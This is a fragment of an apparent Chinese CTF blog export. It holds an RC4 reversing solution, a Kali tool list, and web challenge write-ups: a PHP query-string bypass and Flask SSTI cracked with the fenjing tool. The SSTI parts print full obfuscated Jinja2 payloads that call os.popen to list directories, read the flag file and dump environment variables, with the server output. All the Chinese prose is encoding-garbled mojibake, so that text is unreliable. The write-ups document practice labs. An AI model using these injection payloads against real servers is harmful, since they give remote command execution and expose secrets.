__int64 a3) { int v5; // [rsp+24h] [rbp-1Ch] int v6; // [rsp+28h] [rbp-18h] size_t v7; // [rsp+30h] [rbp-10h] size_t v8; // [rsp+38h] [rbp-8h] v5 = 0; v6 = 0; v7 = 0LL; v8 = strlen(a2); while ( v7 \u0026lt; v8 ) { v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned __int8 *)(v5 + a1)) % 256; sub_400646(v5 + a1, a1 + v6); *(_BYTE *)(a3 + v7) = a2[v7] ^ *(_BYTE *)((unsigned __int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1); ++v7; } return 0LL; } æœ¬é¢˜çš„å¯†é’¥æ˜¯ Nu1Lctf233\nåŠ å¯†åçš„å¯†æ–‡æ˜¯ v8ï¼Œå³\n1 [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4 ] è¿™ä¸ªæ•°ç»„çš„è§£å‡ºæ¥æ˜¯ä¹±ç ,è¿™é‡Œbase64åŠ utf-8ç¼–ç å°±å¯ä»¥å¾—åˆ°å¯†æ–‡\n1 2 3 4 5 6 7 8 python import base64 a=[0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4] s=\u0026#34;\u0026#34; for i in a: s+=chr(i) print(s) print(str(base64.b64encode(s.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) å¯†æ–‡ï¼šw4Yhw4rCv1FDNzF1w6TCjsOAVG/Cj8Ouw7hawqLDgcOrwqU0bXFVCAfCssKoL8O0UcKODMOMM1MxAEDDlsOKw6zDlA==\nè´´ä¸Šæœåˆ°çš„è„šæœ¬ï¼Œæ‹¿åˆ° flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 python import base64 def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): print(\u0026#34;RC4è§£å¯†ä¸»å‡½æ•°è°ƒç”¨æˆåŠŸ\u0026#34;) print(\u0026#39;\\n\u0026#39;) s_box = rc4_init_sbox(key) crypt = rc4_excrypt(message, s_box) return crypt def rc4_init_sbox(key): s_box = list(range(256)) print(\u0026#34;åŸæ¥çš„ s ç›’ï¼š%s\u0026#34; % s_box) print(\u0026#39;\\n\u0026#39;) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] print(\u0026#34;æ··ä¹±åçš„ s ç›’ï¼š%s\u0026#34;% s_box) print(\u0026#39;\\n\u0026#39;) return s_box def rc4_excrypt(plain, box): print(\u0026#34;è°ƒç”¨è§£å¯†ç¨‹åºæˆåŠŸã€‚\u0026#34;) print(\u0026#39;\\n\u0026#39;) plain = base64.b64decode(plain.encode(\u0026#39;utf-8\u0026#39;)) plain = bytes.decode(plain) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) print(\u0026#34;resç”¨äºè§£å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ï¼š%res\u0026#34; %res) print(\u0026#39;\\n\u0026#39;) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s\u0026#34; %cipher) print(\u0026#39;\\n\u0026#39;) print(\u0026#34;è§£å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):\u0026#34;) print(\u0026#39;\\n\u0026#39;) return cipher a=[0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4] s=\u0026#34;\u0026#34; for i in a: s+=chr(i) s=str(base64.b64encode(s.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;) rc4_main(\u0026#34;Nu1Lctf233\u0026#34;, s) å‚è€ƒï¼š\nRC4åŠ å¯†ç®—æ³•ä¸é€†å‘æ–¹æ³•ç®€æ\nRC4åŠ å¯†ç®—æ³• RC4åŠ å¯†ç®—æ³•åŠé€†å‘æ–¹æ³•åˆæ¢\n[BUUCTF_N1book_RE_ç¬¬äº”ç«  CTFä¹‹REç« ]BabyAlgorithm\næœ€åï¼Œå®¶äººä»¬ï¼Œè¡¥è¯ç”¨rustå†™è„šæœ¬ğŸ˜­ğŸ˜­ğŸ˜­ ğŸ¤¡ğŸ¤¡ğŸ¤¡\n","date":"2025-06-01T10:30:53+08:00","permalink":"https://Oight.github.io/p/rc4/","title":"RC4"},{"content":" å‚è€ƒï¼š å¤§å­¦éœ¸ Kali Linux å®‰å…¨æ¸—é€æ•™ç¨‹\næ¸—é€æµ‹è¯•æ˜¯å¯¹ç”¨æˆ·ä¿¡æ¯å®‰å…¨æªæ–½ç§¯æè¯„ä¼°çš„è¿‡ç¨‹ã€‚é€šè¿‡ç³»ç»ŸåŒ–çš„æ“ä½œå’Œåˆ†æï¼Œç§¯æå‘ç°ç³»ç»Ÿå’Œç½‘ç»œä¸­å­˜åœ¨çš„å„ç§ç¼ºé™·å’Œå¼±ç‚¹ï¼Œå¦‚è®¾è®¡ç¼ºé™·å’ŒæŠ€æœ¯ç¼ºé™·ã€‚\næ¸—é€æ‰€éœ€å·¥å…·\rsplint unhide scrub pscan examiner ht flawfinder srm driftnet rats nwipe binwalk ddrescue firstaidkit-gui scalpel gparted xmount pdfcrack testdisk dc3dd wipe foremost afftools safecopy sectool-gui scanmem hfsutils unhide sleuthkit cmospwd examiner macchanger secuirty-menus srm ntfs-3g mc firstaidkit-gui ntfsprogs screen net-snmp pcapdiff openvas-scanner hexedit netsed rkhunter powertop sslstrip nebula mutt bonesi tripwire nano proxychains prelude-lml vim-enhanced prewikka iftop wget prelude-manager scamper yum-utils picviz-gui iptraf-ng firstaidkit-plugin-all onenssh nethogs vnstat dnstracer uperf aircrack-ng chkrootkit nload airsnort aide ntop kismet pads trafshow weplab cowpatty wavemon ä»¥ä¸Šå·¥å…·å¤§éƒ½é›†æˆäºKali linuxä¸­\n","date":"2025-06-01T10:30:35+08:00","image":"https://www.ddosi.org/wp-content/uploads/2022/02/24.webp","permalink":"https://Oight.github.io/p/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","title":"æ¸—é€æ”»å‡»å­¦ä¹ "},{"content":"Web\r1.Sign in\råˆ›å»ºå®ä¾‹æŸ¥çœ‹æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 php Flag is not here! \u0026lt;?php error_reporting(0); include_once \u0026#39;flag.php\u0026#39;; if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } locate(); } else { highlight_file(__FILE__); } ?\u0026gt; ç»å…¸çš„ç»•è¿‡ç­¾åˆ°é¢˜ï¼Œæˆ‘ä»¬å‘ç°ä¸‰å±‚è¿‡æ»¤ã€‚\nç¬¬ä¸€å±‚ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…äº†è‹±æ–‡å­—æ¯ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ä¼ é€’å‚æ•°çš„æ—¶å€™è¦è¿›è¡Œè½¬ç \nç¬¬äºŒå±‚ä½¿ç”¨POSTå‚æ•°ä¼ é€’nsilabï¼Œè¦æ±‚nsilabå€¼çš„MD5ç¼–ç å‰å››ä½æ˜¯ba3fï¼›\nè¿™é‡Œç”¨è„šæœ¬æ¥åŒ¹é…MD5\n1 2 3 4 5 6 7 8 9 10 11 12 13 python import hashlib target = \u0026#34;ba3f\u0026#34; for i in range(1000000): s = str(i) hash_md5 = hashlib.md5(s.encode()).hexdigest() if hash_md5.startswith(target): print(f\u0026#34;Found: {s} â†’ {hash_md5}\u0026#34;) break // Found: 35350 â†’ ba3fe3d296f3e7269b66f163d31b3dc3 ç”¨GETæ–¹å¼ä¼ å‚hi = webï¼Œå¯¹è¿™é‡Œè¿›è¡ŒURLç¼–ç ï¼Œå°†å‚æ•°åå’Œå€¼URLç¼–ç ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼š\nhi â†’ %68%69ï¼ˆhçš„ASCIIç æ˜¯0x68ï¼Œiæ˜¯0x69ï¼‰\nweb â†’ %77%65%62ï¼ˆw=0x77, e=0x65, b=0x62ï¼‰\næ„é€ æŸ¥è¯¢å­—ç¬¦ä¸²\nï¼š\n1 2 plaintext ?%68%69=%77%65%62 ç¬¬ä¸‰å±‚åœ¨COOKIEä¼ å‚æ›´æ”¹user = admin\nä¼ å‚åå‘ç°å¼¹å‡ºçª—å£æç¤ºflagè¦é£èµ°äº†ï¼Œä½¿ç”¨BurpSuiteæŠ“åŒ…å‘ç°flag\n2.ezssti\rç”±é¢˜ï¼Œå¾—åˆ°è¿™æ˜¯ä¸€é“SSTI\nè¿›å»å°è¯•ä¼ é€’49ï¼Œè¿”å›â€œä½ æ˜¯â€¦Hacker!!!å—ï¼Ÿâ€å¯çŸ¥è¿™é‡Œå­˜åœ¨è¿‡æ»¤ã€‚\nä½¿ç”¨ç„šé–æ¥ç»•è¿‡wafè‡ªåŠ¨SSTI\nfenjing crack -u â€œhttp://contest.ctf.nefu.edu.cn:33099/â€œ -i name -m GET â€“detect-mode fast\næˆåŠŸç»•è¿‡ï¼Œlsä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $\u0026gt;\u0026gt; ls INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;ls\u0026#39;) can be \u0026#39;l\u0026#39;+\u0026#39;s\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;ls\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;ls\u0026#39;) INFO:[cli] | Submit payload {{ ((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—ï¼š\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;ä½ æ˜¯... app.py å—ï¼Ÿ\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; åªå‘ç°äº† app.py\nls -a åŒæ ·åªæœ‰app.py\nç”¨cd .. \u0026amp;\u0026amp; ls -a åˆ°æ ¹ç›®å½•ä¸‹çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 $\u0026gt;\u0026gt; cd .. \u0026amp;\u0026amp; ls -a INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) can be \u0026#39;c\u0026#39;+\u0026#39;d\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;-\u0026#39;+\u0026#39;a\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) INFO:[cli] | Submit payload {{ ((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;d\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;-\u0026#39;+\u0026#39;a\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—ï¼š\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;ä½ æ˜¯... . .. .dockerenv .flll4ggggg app bin dev etc home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var å—ï¼Ÿ\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å‘ç°.flll4ggggæ–‡ä»¶ï¼Œcatä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $\u0026gt;\u0026gt; cat /.flll4ggggg INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;cat /.flll4ggggg\u0026#39;) can be \u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;/\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;4\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;cat /.flll4ggggg\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;cat /.flll4ggggg\u0026#39;) INFO:[cli] | Submit payload {{ ((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;/\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;4\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;è¯·å‘Šè¯‰æˆ‘ä½ çš„åå­—ï¼š\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;ä½ æ˜¯... nsilab{71e70fed-9cf5-48d3-aa28-13c3ebaa3ebb} å—ï¼Ÿ\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¾—åˆ°flag\nåŒæ—¶æˆ‘ä¹Ÿåœ¨NSSCTFä¸Šæ‰¾åˆ°åŒæ ·ä½¿ç”¨ç„šé–çš„SSTIï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼š\n[HZNUCTF 2023 preliminary]flask\nåˆ›å»ºå®ä¾‹å‘ç°ç¡®å®æ˜¯SSTIï¼Œä½†æ˜¯å®ƒä¼šæŠŠä¼ é€’çš„æ‰€æœ‰å‚æ•°éƒ½åå†™\n1 2 3 http://node5.anna.nssctf.cn:21944/?name={a+b} å›æ˜¾: hello! }b a{ æ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™ä¸ªè„šæœ¬æ¥å¤„ç†ä¸€ä¸‹æˆ‘ä»¬çš„è¾“å…¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 python from flask import Flask, request, jsonify import requests app = Flask(__name__) @app.route(\u0026#39;/proxy\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def proxy(): name = request.args.get(\u0026#39;name\u0026#39;) # 1. éªŒè¯ name å‚æ•°æ˜¯å¦æœ‰æ•ˆ if not name: return jsonify(error=\u0026#34;Missing \u0026#39;name\u0026#39; parameter\u0026#34;), 400 try: reversed_name = name[::-1] # åè½¬åå­— result = to_proxy(reversed_name) return result except Exception as e: return jsonify(error=str(e)), 500 def to_proxy(name): base_url = \u0026#34;http://node5.anna.nssctf.cn:21944/\u0026#34; params = {\u0026#39;name\u0026#39;: name} # ä½¿ç”¨å‚æ•°å­—å…¸é¿å…æ‰‹åŠ¨æ‹¼æ¥ try: # 2. ä½¿ç”¨ requests çš„å‚æ•°åŒ– URL å¹¶è®¾ç½®è¶…æ—¶ resp = requests.get(base_url, params=params, timeout=5) resp.raise_for_status() # æ£€æŸ¥ HTTP é”™è¯¯ï¼ˆå¦‚ 404ã€500ï¼‰ return resp.text except requests.exceptions.RequestException as e: raise Exception(f\u0026#34;Proxy request failed: {str(e)}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=30000, debug=False) ç„¶åä½¿ç”¨ç„šé–\nfenjing crack -u \u0026ldquo;http://198.18.0.1:30000/proxy\u0026rdquo; -i name -m GET \u0026ndash;detect-mode fast\nls å‘ç°åªæœ‰\nhello! app.py require.txt envçœ‹çœ‹ç¯å¢ƒå˜é‡\n$\u0026gt;\u0026gt; env INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string('env') can be 'e'+'n'+'v' INFO:[payload_gen] | Great, we generate os_popen_obj('env') INFO:[payload_gen] | Great, we generate os_popen_read('env') INFO:[cli] | Submit payload {%print (((((cycler|attr('n'+'e'+'x'+'t')|attr('_'+'_'+'g'+'l'+'o'+'b'+'a'+'l'+'s'+'_'+'_')|attr('_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_'))('_'+'_'+'b'+'u'+'i'+'l'+'t'+'i'+'n'+'s'+'_'+'_')|attr('_'+'_'+'g'+'e'+'t'+'i'+'t'+'e'+'m'+'_'+'_'))('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_'))('o'+'s')|attr('p'+'o'+'p'+'e'+'n'))('e'+'n'+'v')|attr('r'+'e'+'a'+'d'))()%} hello! HOSTNAME=8f82eec3db4b4210 PYTHON_PIP_VERSION=20.1 HOME=/root GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 WERKZEUG_SERVER_FD=3 PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.8.2 PWD=/app 